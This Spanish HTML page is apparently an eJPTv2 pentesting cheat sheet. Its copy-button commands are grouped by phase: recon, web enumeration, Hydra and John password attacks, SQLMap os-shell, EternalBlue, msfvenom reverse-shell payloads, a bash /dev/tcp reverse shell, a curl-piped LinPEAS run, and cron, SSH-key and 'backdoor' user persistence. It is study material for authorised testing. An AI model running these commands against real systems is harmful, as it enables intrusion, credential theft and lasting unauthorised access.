<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>eJPTv2 - Guía de Pentesting</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: linear-gradient(135deg, #0f1419 0%, #1a1f2e 100%);
      color: #e0e7ff;
      line-height: 1.6;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 40px 20px;
    }

    header {
      text-align: center;
      margin-bottom: 50px;
      padding: 40px 0;
    }

    h1 {
      font-size: 3em;
      background: linear-gradient(90deg, #60a5fa, #34d399);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 10px;
    }

    .subtitle {
      color: #94a3b8;
      font-size: 1.1em;
    }

    .roadmap-container {
      display: flex;
      flex-direction: column;
      gap: 30px;
      position: relative;
    }

    .phase {
      background: #1a1f2e;
      border-radius: 12px;
      border: 1px solid #2d3e52;
      overflow: hidden;
      transition: all 0.3s ease;
    }

    .phase:hover {
      border-color: #60a5fa;
      box-shadow: 0 0 20px rgba(96, 165, 250, 0.2);
    }

    .phase-header {
      background: #0f1419;
      padding: 20px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: space-between;
      user-select: none;
    }

    .phase-header:hover {
      background: #151b27;
    }

    .phase-title-group {
      display: flex;
      align-items: center;
      gap: 15px;
      flex: 1;
    }

    .phase-number {
      background: #60a5fa;
      color: #000;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 1.2em;
      flex-shrink: 0;
    }

    .phase-title {
      font-size: 1.3em;
      font-weight: 600;
    }

    .phase-description {
      color: #94a3b8;
      font-size: 0.9em;
      margin-left: 55px;
    }

    .toggle-icon {
      width: 24px;
      height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: transform 0.3s;
    }

    .phase.closed .toggle-icon {
      transform: rotate(-90deg);
    }

    .phase-content {
      padding: 30px;
      display: none;
    }

    .phase.open .phase-content {
      display: block;
    }

    .tools-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
    }

    .tool {
      background: #0d1117;
      border: 1px solid #2d3e52;
      border-radius: 8px;
      overflow: hidden;
      transition: all 0.2s;
    }

    .tool:hover {
      border-color: #34d399;
      transform: translateY(-2px);
    }

    .tool-header {
      background: #151b27;
      padding: 15px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: space-between;
      user-select: none;
    }

    .tool-name {
      font-weight: 600;
      font-size: 1em;
    }

    .tool-toggle {
      transition: transform 0.2s;
    }

    .tool.tool-closed .tool-toggle {
      transform: rotate(-90deg);
    }

    .commands {
      display: none;
      padding: 15px;
    }

    .tool.tool-open .commands {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .command-block {
      background: #06101a;
      border: 1px solid #2d3e52;
      border-radius: 6px;
      overflow: hidden;
    }

    .cmd-header {
      background: #0a1420;
      padding: 10px 12px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid #2d3e52;
    }

    .cmd-label {
      color: #fbbf24;
      font-size: 0.9em;
      font-weight: 600;
    }

    .copy-btn {
      background: rgba(96, 165, 250, 0.1);
      border: 1px solid rgba(96, 165, 250, 0.3);
      color: #60a5fa;
      padding: 5px 12px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 0.85em;
      font-weight: 600;
      transition: all 0.2s;
      font-family: 'Courier New', monospace;
    }

    .copy-btn:hover {
      background: rgba(96, 165, 250, 0.2);
      border-color: #60a5fa;
    }

    .copy-btn.copied {
      background: rgba(52, 211, 153, 0.2);
      border-color: #34d399;
      color: #34d399;
    }

    .cmd-code {
      padding: 12px;
      font-family: 'Courier New', monospace;
      font-size: 0.9em;
      color: #86efac;
      overflow-x: auto;
      white-space: pre-wrap;
      word-break: break-word;
      line-height: 1.4;
    }

    .cmd-expl {
      padding: 10px 12px;
      background: #0a1420;
      border-top: 1px solid #2d3e52;
      color: #94a3b8;
      font-size: 0.85em;
      line-height: 1.5;
    }

    .tips-section {
      background: linear-gradient(135deg, #064e3b 0%, #1e3a8a 100%);
      padding: 30px;
      border-radius: 12px;
      margin: 50px 0;
    }

    .tips-title {
      font-size: 1.3em;
      font-weight: 600;
      margin-bottom: 20px;
      color: #fff;
    }

    .tips-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 15px;
    }

    .tip {
      background: rgba(0, 0, 0, 0.3);
      padding: 15px;
      border-radius: 6px;
      border-left: 3px solid #fbbf24;
      font-size: 0.95em;
      line-height: 1.5;
    }

    footer {
      text-align: center;
      padding: 30px;
      color: #64748b;
      font-size: 0.9em;
    }

    @media (max-width: 768px) {
      h1 {
        font-size: 1.8em;
      }

      .tools-grid {
        grid-template-columns: 1fr;
      }

      .phase-description {
        margin-left: 0;
        display: none;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>eJPTv2 - Metodología de Pentesting</h1>
      <p class="subtitle">Guía completa con comandos copiables</p>
    </header>

    <div class="tips-section">
      <div class="tips-title">Cómo usar esta guía</div>
      <div class="tips-grid">
        <div class="tip">1. Abre cada fase para ver las herramientas</div>
        <div class="tip">2. Haz clic en cada herramienta para ver sus comandos</div>
        <div class="tip">3. Usa el botón COPIAR para copiar cada comando</div>
        <div class="tip">4. Adapta IPs y dominios según tu objetivo</div>
        <div class="tip">5. Documenta cada descubrimiento</div>
        <div class="tip">6. Prueba credenciales default en todos lados</div>
      </div>
    </div>

    <div class="roadmap-container" id="roadmap"></div>

    <div class="tips-section">
      <div class="tips-title">Tips Pro para el Examen</div>
      <div class="tips-grid">
        <div class="tip">Combina herramientas: Nmap → Searchsploit → Metasploit</div>
        <div class="tip">Reutiliza passwords encontradas en todos los servicios</div>
        <div class="tip">Guarda outputs: -oN output.txt</div>
        <div class="tip">Si encuentras un puerto, enuméralo completamente</div>
        <div class="tip">Busca SUID binarios y sudo permisos</div>
        <div class="tip">Verifica cron jobs y archivos de configuración</div>
      </div>
    </div>

    <footer>
      Archivo HTML autónomo - Usa solo en entornos autorizados
    </footer>
  </div>

  <script>
    const phases = [
      {
        name: "Reconocimiento Pasivo",
        description: "OSINT y fuentes públicas - sin interactuar con el objetivo",
        tools: [
          {
            name: "WHOIS & DNS",
            commands: [
              { label: "WHOIS", cmd: "whois dominio.com" },
              { label: "DNS Basico", cmd: "dig dominio.com any" },
              { label: "DNS Inverso", cmd: "dig -x 192.168.1.100" },
              { label: "Subdominios", cmd: "dnsenum dominio.com" }
            ]
          },
          {
            name: "OSINT",
            commands: [
              { label: "TheHarvester", cmd: "theHarvester -d dominio.com -b google,bing,linkedin" },
              { label: "Certificados SSL", cmd: "curl https://crt.sh/?q=%.dominio.com" },
              { label: "Wayback Machine", cmd: "curl 'http://web.archive.org/cdx/search/cdx?url=dominio.com/*&output=text'" }
            ]
          }
        ]
      },
      {
        name: "Reconocimiento Activo",
        description: "Escaneo activo de la red - descubrimiento de hosts y puertos",
        tools: [
          {
            name: "Nmap Basico",
            commands: [
              { label: "Ping Sweep", cmd: "nmap -sn 192.168.1.0/24" },
              { label: "Top 100 puertos", cmd: "nmap -F 192.168.1.100" },
              { label: "Todos los puertos", cmd: "nmap -sV -sC -p- 192.168.1.100 -oN scan.txt" },
              { label: "UDP top 100", cmd: "nmap -sU --top-ports 100 192.168.1.100" }
            ]
          },
          {
            name: "Nmap Avanzado",
            commands: [
              { label: "Deteccion SO", cmd: "nmap -A 192.168.1.100" },
              { label: "Vulnerabilidades", cmd: "nmap --script vuln 192.168.1.100" },
              { label: "Enum SMB", cmd: "nmap --script smb-enum-shares,smb-enum-users 192.168.1.100" }
            ]
          }
        ]
      },
      {
        name: "Enumeración Web",
        description: "Descubrir directorios, archivos y aplicaciones web",
        tools: [
          {
            name: "Gobuster",
            commands: [
              { label: "Directorios", cmd: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt" },
              { label: "Archivos .php", cmd: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt" },
              { label: "Subdominios", cmd: "gobuster dns -d dominio.com -w /usr/share/wordlists/subdomains-top1million-5000.txt" }
            ]
          },
          {
            name: "Nikto",
            commands: [
              { label: "Escaneo basico", cmd: "nikto -h http://192.168.1.100" },
              { label: "Puerto personalizado", cmd: "nikto -h 192.168.1.100 -p 8080" },
              { label: "HTTPS", cmd: "nikto -h https://192.168.1.100 -ssl" },
              { label: "Guardar reporte", cmd: "nikto -h http://192.168.1.100 -o results.html -Format html" }
            ]
          },
          {
            name: "WPScan",
            commands: [
              { label: "Escaneo basico", cmd: "wpscan --url http://dominio.com" },
              { label: "Enumerar usuarios", cmd: "wpscan --url http://dominio.com --enumerate u" },
              { label: "Plugins vulnerables", cmd: "wpscan --url http://dominio.com --enumerate vp" },
              { label: "Fuerza bruta", cmd: "wpscan --url http://dominio.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin" }
            ]
          },
          {
            name: "Scraping Imagenes",
            commands: [
              { label: "wget recursivo", cmd: "wget -r -l 2 -A jpg,jpeg,png,gif http://dominio.com/images/" },
              { label: "Solo imagenes", cmd: "wget -nd -H -p -A jpg,jpeg,png,gif -e robots=off http://dominio.com" },
              { label: "cURL con grep", cmd: "curl -s http://dominio.com | grep -oP 'src=\"\\K[^\"]*\\.(jpg|png|gif)'" },
              { label: "Metadata", cmd: "exiftool *.jpg" }
            ]
          }
        ]
      },
      {
        name: "Enumeración de Servicios",
        description: "Enumerar servicios específicos encontrados",
        tools: [
          {
            name: "SMB",
            commands: [
              { label: "Listar shares", cmd: "smbclient -L //192.168.1.100 -N" },
              { label: "Enum4linux", cmd: "enum4linux -a 192.168.1.100" },
              { label: "SMBMap", cmd: "smbmap -H 192.168.1.100 -u guest" },
              { label: "Nmap SMB", cmd: "nmap --script smb-vuln* 192.168.1.100" }
            ]
          },
          {
            name: "FTP",
            commands: [
              { label: "Conectar", cmd: "ftp 192.168.1.100" },
              { label: "Nmap anonimo", cmd: "nmap --script ftp-anon 192.168.1.100" },
              { label: "Descargar todo", cmd: "wget -r ftp://anonymous:@192.168.1.100/" }
            ]
          },
          {
            name: "Bases de Datos",
            commands: [
              { label: "MySQL", cmd: "mysql -h 192.168.1.100 -u root -p" },
              { label: "Nmap MySQL", cmd: "nmap --script mysql-enum 192.168.1.100" },
              { label: "PostgreSQL", cmd: "psql -h 192.168.1.100 -U postgres" }
            ]
          }
        ]
      },
      {
        name: "Ataques de Contraseña",
        description: "Fuerza bruta y cracking de contraseñas",
        tools: [
          {
            name: "Hydra",
            commands: [
              { label: "SSH", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100" },
              { label: "HTTP POST", cmd: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'" },
              { label: "FTP", cmd: "hydra -L users.txt -P passwords.txt ftp://192.168.1.100" },
              { label: "SMB", cmd: "hydra -l administrator -P rockyou.txt smb://192.168.1.100" }
            ]
          },
          {
            name: "Hydra WordPress",
            commands: [
              { label: "wp-login.php", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=ERROR'" },
              { label: "xmlrpc.php", cmd: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/xmlrpc.php:log=^USER^&pwd=^PASS^:F=403'" }
            ]
          },
          {
            name: "John the Ripper",
            commands: [
              { label: "Crackear hash", cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" },
              { label: "Ver crackeados", cmd: "john --show hash.txt" },
              { label: "SSH key", cmd: "ssh2john id_rsa > ssh_hash.txt && john ssh_hash.txt" },
              { label: "ZIP", cmd: "zip2john file.zip > zip_hash.txt && john zip_hash.txt" }
            ]
          }
        ]
      },
      {
        name: "Explotación",
        description: "Explotar vulnerabilidades encontradas",
        tools: [
          {
            name: "SQLMap",
            commands: [
              { label: "Detectar SQLi", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --batch" },
              { label: "Listar DBs", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --dbs" },
              { label: "Dumpear tabla", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database -T users --dump" },
              { label: "OS Shell", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --os-shell" }
            ]
          },
          {
            name: "Metasploit",
            commands: [
              { label: "Iniciar", cmd: "msfconsole" },
              { label: "Buscar", cmd: "search eternalblue" },
              { label: "EternalBlue", cmd: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nexploit" },
              { label: "msfvenom", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe" }
            ]
          },
          {
            name: "Searchsploit",
            commands: [
              { label: "Buscar", cmd: "searchsploit apache 2.4.49" },
              { label: "Ver codigo", cmd: "searchsploit -x 49584" },
              { label: "Copiar", cmd: "searchsploit -m 49584" }
            ]
          }
        ]
      },
      {
        name: "Post-Explotación",
        description: "Escalación, pivoting y persistencia",
        tools: [
          {
            name: "Shells",
            commands: [
              { label: "Listener", cmd: "nc -lvnp 4444" },
              { label: "Reverse bash", cmd: "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" },
              { label: "Python TTY", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
              { label: "Transferir archivo", cmd: "nc -lvnp 4444 > file.txt" }
            ]
          },
          {
            name: "Escalación",
            commands: [
              { label: "SUID binarios", cmd: "find / -perm -4000 2>/dev/null" },
              { label: "Sudo permisos", cmd: "sudo -l" },
              { label: "LinPEAS", cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" },
              { label: "Capabilities", cmd: "getcap -r / 2>/dev/null" }
            ]
          },
          {
            name: "Pivoting",
            commands: [
              { label: "SSH Local Forward", cmd: "ssh -L 8080:localhost:80 user@192.168.1.100" },
              { label: "SSH Remote Forward", cmd: "ssh -R 8080:localhost:80 user@192.168.1.100" },
              { label: "SSH SOCKS", cmd: "ssh -D 9050 user@192.168.1.100" },
              { label: "ProxyChains", cmd: "proxychains nmap -sT 10.10.10.0/24" },
              { label: "SSHuttle VPN", cmd: "sshuttle -r user@192.168.1.100 10.10.10.0/24" }
            ]
          },
          {
            name: "Persistencia",
            commands: [
              { label: "Cron job", cmd: "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/192.168.1.50/4444 0>&1\"' | crontab -" },
              { label: "SSH Key", cmd: "cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys" },
              { label: "Backdoor user", cmd: "useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd" }
            ]
          }
        ]
      }
    ];

    const roadmapDiv = document.getElementById('roadmap');

    phases.forEach((phase, phaseIdx) => {
      const phaseDiv = document.createElement('div');
      phaseDiv.className = 'phase closed';

      const phaseHeader = document.createElement('div');
      phaseHeader.className = 'phase-header';
      phaseHeader.innerHTML = `
        <div class="phase-title-group">
          <div class="phase-number">${phaseIdx + 1}</div>
          <div>
            <div class="phase-title">${phase.name}</div>
            <div class="phase-description">${phase.description}</div>
          </div>
        </div>
        <div class="toggle-icon">▶</div>
      `;

      phaseHeader.addEventListener('click', function() {
        phaseDiv.classList.toggle('open');
        phaseDiv.classList.toggle('closed');
      });

      phaseDiv.appendChild(phaseHeader);

      const phaseContent = document.createElement('div');
      phaseContent.className = 'phase-content';

      const toolsGrid = document.createElement('div');
      toolsGrid.className = 'tools-grid';

      phase.tools.forEach(tool => {
        const toolDiv = document.createElement('div');
        toolDiv.className = 'tool tool-closed';

        const toolHeader = document.createElement('div');
        toolHeader.className = 'tool-header';
        toolHeader.innerHTML = `
          <span class="tool-name">${tool.name}</span>
          <span class="tool-toggle">▶</span>
        `;

        toolHeader.addEventListener('click', function() {
          toolDiv.classList.toggle('tool-open');
          toolDiv.classList.toggle('tool-closed');
        });

        toolDiv.appendChild(toolHeader);

        const commandsDiv = document.createElement('div');
        commandsDiv.className = 'commands';

        tool.commands.forEach(cmd => {
          const cmdBlock = document.createElement('div');
          cmdBlock.className = 'command-block';

          const cmdHeader = document.createElement('div');
          cmdHeader.className = 'cmd-header';
          cmdHeader.innerHTML = `
            <span class="cmd-label">${cmd.label}</span>
            <button class="copy-btn" onclick="copiarComando(this)">COPIAR</button>
          `;

          const cmdCode = document.createElement('div');
          cmdCode.className = 'cmd-code';
          cmdCode.textContent = cmd.cmd;
          cmdCode.style.display = 'none';

          const cmdExpl = document.createElement('div');
          cmdExpl.className = 'cmd-expl';
          cmdExpl.textContent = '✓ ' + (cmd.desc || cmd.label);

          cmdBlock.appendChild(cmdHeader);
          cmdBlock.appendChild(cmdCode);
          cmdBlock.appendChild(cmdExpl);

          cmdBlock.firstChild.addEventListener('click', function() {
            const codeDiv = cmdBlock.querySelector('.cmd-code');
            codeDiv.style.display = codeDiv.style.display === 'none' ? 'block' : 'none';
          });

          cmdBlock.style.cursor = 'pointer';

          commandsDiv.appendChild(cmdBlock);
        });

        toolDiv.appendChild(commandsDiv);
        toolsGrid.appendChild(toolDiv);
      });

      phaseContent.appendChild(toolsGrid);
      phaseDiv.appendChild(phaseContent);

      roadmapDiv.appendChild(phaseDiv);
    });

    function copiarComando(btn) {
      const cmdBlock = btn.closest('.command-block');
      const cmdCode = cmdBlock.querySelector('.cmd-code');
      const texto = cmdCode.textContent.trim();

      navigator.clipboard.writeText(texto).then(() => {
        const originalText = btn.textContent;
        btn.textContent = '✓ COPIADO';
        btn.classList.add('copied');

        setTimeout(() => {
          btn.textContent = originalText;
          btn.classList.remove('copied');
        }, 2000);
      }).catch(() => {
        alert('Error al copiar');
      });
    }
  </script>
</body>
</html>
